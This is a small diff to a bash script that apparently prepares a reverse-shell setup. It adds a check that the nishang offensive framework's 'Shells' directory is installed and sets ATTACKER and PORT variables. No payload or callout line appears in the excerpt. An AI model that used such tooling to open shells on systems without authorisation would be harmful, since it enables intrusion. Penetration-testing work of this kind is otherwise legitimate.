@@ -1,5 +1,10 @@
 #!/bin/bash
 
+if [ ! -d "/usr/share/nishang/Shells" ]; then
+  echo "need to install nishang first..."
+  echo "sudo apt install nishang"
+  exit 1
+fi
 ATTACKER=$(getmyip)
 PORT=$1
 if [ -z "$PORT" ]; then
